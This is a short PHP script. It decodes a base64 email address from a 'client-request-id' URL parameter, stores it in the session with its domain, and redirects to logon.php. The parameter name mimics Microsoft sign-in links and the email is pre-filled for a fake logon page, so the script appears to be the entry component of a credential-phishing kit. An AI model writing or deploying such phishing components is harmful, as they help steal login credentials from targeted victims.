<?php

// Start Session

session_start();


// Get Email

$mail = base64_decode($_GET['client-request-id']);
$_SESSION['mail'] = $mail;


// Get Domain
$b = explode('@', $mail);
$domain = $b[1];

// Derive Short Domain 

$a = explode('.', $mail);
$domain_2 = $a[1];

// Redirect to Main Page

header("Location: logon.php");

?>